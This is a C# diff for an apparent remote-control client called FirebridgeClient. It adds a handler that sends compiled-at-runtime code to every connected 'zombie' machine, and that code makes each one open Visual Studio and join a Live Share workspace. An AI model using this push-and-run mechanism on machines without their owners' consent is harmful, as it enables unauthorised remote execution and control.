@@ -174,5 +174,36 @@ namespace FirebridgeClient.Controls
             foreach (var zombie in zombieViews)
                 zombie.SendPacket(new Packet() { Id = 2, Data = 70 });
         }
+
+        private void _shareVS_Click(object sender, EventArgs e)
+        {
+            textMessageBox messageBox = new textMessageBox();
+            messageBox.ShowDialog();
+            if (!messageBox.Success)
+                return;
+
+            string txt = messageBox._vslink.Text;
+
+            var code = txt.Split('?');
+
+            foreach (var zombie in zombieViews)
+            {
+                zombie.SendPacket(new Packet()
+                {
+                    Id = 1,
+                    Data = new MiniProgramModel()
+                    {
+                        Code = "using System.Diagnostics; \r\nusing System.Text.RegularExpressions; \r\nusing System;\r\nusing System.Diagnostics;\r\nusing System.Linq;\r\nusing FirebridgeShared.Networking;\r\n\r\nnamespace TestApp\r\n{\r\n    public static class Program\r\n    {\r\n        public static void Main(Connection s)\r\n        {\r\n            Process p = new Process();\r\n            \r\n            p.StartInfo.FileName = Environment.ExpandEnvironmentVariables(\"%ProgramFiles(x86)%\\\\Microsoft Visual Studio\\\\Installer\\\\vswhere.exe\");\r\n            p.StartInfo.UseShellExecute = false;\r\n            p.StartInfo.RedirectStandardOutput = true;\r\n            p.Start();\r\n\r\n            string output = p.StandardOutput.ReadToEnd();\r\n            p.WaitForExit();\r\n\r\n            string vspath = Regex.Match(output, @\"installationPath:(.*)\").Groups[1].Value;\r\n            vspath = vspath.Replace(\"\\r\", \"\");\r\n            string installPath = vspath + \"\\\\Common7\\\\IDE\\\\\";\r\n\r\n            string vs = \"devenv.exe\";\r\n\r\n            p = new Process();\r\n\r\n            p.StartInfo.UseShellExecute = true;\r\n            p.StartInfo.WorkingDirectory = installPath;\r\n            p.StartInfo.FileName = vs;\r\n            p.StartInfo.Arguments = \"/client /joinworkspace \\\"vsls:?action=join&workspaceId="
+                        + code.Last()
+                        + "&correlationId=null\\\"\";\r\n            p.Start();\r\n        }\r\n    }\r\n}\r\n",
+                        EntryPoint = "TestApp.Program",
+                        References = new List<string>()
+                    {
+                        "System.dll", "FirebridgeShared.dll", "netstandard.dll","System.Core.dll","System.Drawing.dll","System.Windows.Forms.dll"
+                    },
+                    }
+                });
+            }
+        }
     }
 }
